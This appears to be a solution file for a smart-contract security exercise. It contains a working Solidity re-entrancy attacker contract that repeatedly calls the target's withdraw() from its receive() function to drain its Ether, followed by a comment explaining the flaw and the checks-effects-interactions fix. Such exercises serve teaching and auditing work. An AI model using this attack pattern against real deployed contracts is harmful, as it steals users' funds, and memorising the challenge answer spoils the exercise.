// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Question5} from "../src/Question5.sol";

contract Solution5 {

    // address of target contract
    address public target;

    constructor(address target_){
        target = target_;
    }

    receive() external payable {
        if(target.balance != 0) exploit();
    }

    function exploit() internal {
        Question5(target).withdraw();
    }

    function deposit(uint256 amount) external {
        Question5(target).deposit{value: amount}();
    }

    function attack() external {
        Question5(target).withdraw();
    }

}


/** Explanation:

    The target contract's withdraw function can be exploited via a re-entrancy attack.
    The vulnerability lies in the fact that the contract updates the balance of the user to zero after transferring Ether to the user.
    This sequence of operations creates a race condition where an attacker can recursively call the withdraw function and drain the contract's funds.

    The attacker contract (Solution5) deposits 1 ether via its deposit function.
    Subsequently the attacker initates the attack by calling attack(). 
    This calls withdraw() on the target contract, which leads to the target contract sending 1 ether via a low-level call to the msg.sender.
    
    This invokes the fallback function receive(), on Solution5, as call() did not specify a function to execute.
    When receive() is executed, it calls withdraw() on Question5 again, draining it of its 1 ether.

    This is because the balanceOf mapping had not yet been updated before the external call was made.

    Question5 should adhere to checks-effects-interactions pattern to avoid this vulnerability.

 */